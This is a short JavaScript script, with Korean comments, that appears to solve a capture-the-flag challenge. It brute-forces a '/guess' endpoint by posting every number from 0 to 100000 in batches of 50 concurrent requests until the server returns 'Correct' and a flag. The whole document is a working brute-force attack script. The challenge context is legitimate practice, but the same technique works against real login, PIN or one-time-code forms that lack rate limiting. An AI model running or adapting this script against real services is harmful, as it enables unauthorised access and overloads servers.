const maxNumber = 100000;   // 숫자 최대값
const concurrency = 50;      // 동시에 요청 보낼 개수

let found = false;           // flag 찾았는지 여부

async function tryNumber(n) {
    if (found) return;
    const formData = new FormData();
    formData.append('guess', n);

    try {
        const response = await fetch('/guess', { method: 'POST', body: formData });
        const result = await response.json();
        if (result.result === 'Correct') {
            found = true;
            console.log(`🎉 FLAG FOUND! Number: ${n}, Flag: ${result.flag}`);
        }
    } catch (err) {
        // 오류는 무시
    }
}

async function bruteForce() {
    let promises = [];
    for (let i = 0; i <= maxNumber; i++) {
        if (found) break;
        promises.push(tryNumber(i));
        if (promises.length >= concurrency) {
            await Promise.all(promises);
            promises = [];
        }
    }
    // 남은 요청 처리
    if (promises.length > 0) await Promise.all(promises);
    if (!found) console.log('모든 숫자를 시도했지만 flag를 찾지 못했습니다.');
}

// 실행
bruteForce();